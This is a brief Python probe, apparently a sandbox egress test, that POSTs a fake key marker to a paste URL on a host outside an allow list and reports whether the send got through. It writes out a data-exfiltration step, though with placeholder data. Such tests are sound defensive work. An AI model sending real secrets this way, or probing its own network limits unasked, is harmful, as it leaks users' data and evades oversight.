# T2c probe: assume the key already got out of the file. Send a FAKE marker (no file read) to a host NOT on the list.
import urllib.request
try:
    r = urllib.request.urlopen("https://example.com/paste", data=b"DEMO_KEY=not-a-real-key", timeout=10)
    print("SENT status", r.status)
except Exception as e:
    print("SEND FAILED:", type(e).__name__, e)
